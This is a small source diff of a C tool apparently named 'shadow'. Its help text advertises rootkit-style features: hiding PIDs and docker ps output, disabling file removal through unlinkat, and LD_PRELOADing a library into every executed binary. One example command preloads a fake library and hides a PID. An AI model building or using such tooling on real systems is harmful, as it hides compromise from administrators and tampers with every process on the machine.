@@ -94,7 +94,7 @@ const char argp_program_doc[] =
 "\n"
 "Removes output from docker -ps, hides pid, destroys unlinkat to disable removing files :) and LD_PRELOAD every execve'd binary\n"
 "\n"
-"USAGE ./shadow -p -l 'LD_PRELOAD string'\n"
+"USAGE ./shadow -d -p -l 'LD_PRELOAD-string'\n"
 "EXAMPLES:\n"
 "LD_PRELOAD fakelib and hide PID:\n"
 "   ./shadow -p -l 'LD_PRELOAD=/path/to/fakelib.so'\n"
@@ -141,7 +141,7 @@ static const struct argp argp = {
     .doc = argp_program_doc,
 };
 
-int main(int argc, char *argv[])
+int main(int argc, char **argv)
 {
     struct shadow_bpf *skel = NULL;
     struct ring_buffer *rb = NULL;
